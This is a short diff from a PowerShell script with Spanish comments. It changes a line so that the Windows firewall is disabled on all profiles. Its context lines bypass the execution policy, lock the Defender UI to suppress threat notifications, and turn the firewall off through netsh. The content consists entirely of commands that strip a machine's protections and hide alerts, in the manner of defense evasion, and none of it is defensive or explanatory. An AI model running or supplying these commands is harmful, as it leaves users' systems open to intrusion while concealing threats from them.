@@ -8,7 +8,7 @@ Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Comm
 Set-MpPreference -UILockdown $true          # Desactiva las notificaciones de amenazas grave
 
 # Desactiva FireWall
-Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled true
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false
 
 # Desactiva FireWall CMD
 netsh firewall opmode disable
